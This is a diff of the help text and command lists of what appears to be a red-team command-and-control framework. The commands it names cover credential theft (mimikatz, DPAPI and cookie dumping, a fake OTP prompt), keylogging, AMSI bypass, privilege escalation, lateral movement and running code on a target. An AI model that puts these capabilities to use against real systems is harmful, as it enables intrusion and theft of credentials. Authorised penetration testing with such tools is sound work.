@@ -144,11 +144,9 @@ cred-popper "Putty" "Please re-enter your OTP code" "root@172.16.0.1"
 get-hash
 sharpup
 sharpweb all
-seatbelt all
-seatbelt BasicOSInfo
-seatbelt SysmonConfig
-seatbelt PowerShellSettings
-seatbelt RegistryAutoRuns
+seatbelt -group=all
+seatbelt -group=chrome
+seatbelt -group=misc
 watson
 sharpcookiemonster
 sharpdpapi machinetriage
@@ -235,6 +233,12 @@ Run Generic C# Executable:
 # See Alias.py for examples or to add your own aliases
 loadmodule MyBinary.exe
 run-exe <FullyQualifiedClassWithMainMethod> <MyBinaryAssemblyName>
+
+Dynamically compile and run code on the target
+==============================================
+# Edit payloads/DynamicCode.cs then:
+dynamic-code
+dynamic-code <args>
 
 """
 
@@ -592,7 +596,7 @@ COMMANDS = ['loadmodule', "invoke-bloodhound", "brute-ad", "brute-locadmin",
             "invoke-wmievent", "remove-wmievent", "get-wmievent", "invoke-smbclient", "get-keystrokedata", "unhidefile", "hidefile", "remove-label", "label-implant",
             'invoke-psexecpayload', 'invoke-wmijspayload', 'invoke-wmipayload', 'invoke-dcompayload',
             "get-ipconfig", 'invoke-wmijspbindpayload', 'get-lapspasswords', "get-inveigh", "runas-netonly", "invoke-edrchecker",
-            "searchhistory", "enable-rotation", "get-rotation"]
+            "enable-rotation", "get-rotation", "invoke-urlcheck", "searchhistory"]
 
 # post help commands python implant
 UXCOMMANDS = ["label-implant", "remove-label", "unhide-implant", "hide-implant", "help", "searchhelp", "python", "loadmodule",
@@ -609,5 +613,5 @@ SHARPCOMMANDS = ["get-userinfo", "get-idletime", "stop-keystrokes", "start-keyst
                  "get-dodgyprocesses", "sharpweb", "bypass-amsi", "sharpsc", "dcomexec", "smbexec", "wmiexec", "sharpwmi", "sharpcookiemonster", "stop-screenshotmulti",
                  "get-screenshotallwindows", "del", "kill-process", "posh-delete", "getremoteprocesslisting", "getremoteprocesslistingall", "sslinspectioncheck",
                  "dynamic-code", "startdaisy", "mimikatz", "searchhistory", "stopdaisy", "portscan", "sharpdpapi", "sharpchrome", "sweetpotato",
-                 "pbind-connect", "pbind-pslo", "pbind-loadmodule", "pbind-command", "pbind-kill","run-exe-background", "run-dll-background",
+                 "pbind-connect", "pbind-pslo", "pbind-loadmodule", "pbind-command", "pbind-kill", "run-exe-background", "run-dll-background",
                  "inveigh", "stopinveigh", "enable-rotation", "get-rotation", "loadpowerstatus", "getpowerstatus", "stoppowerstatus"]
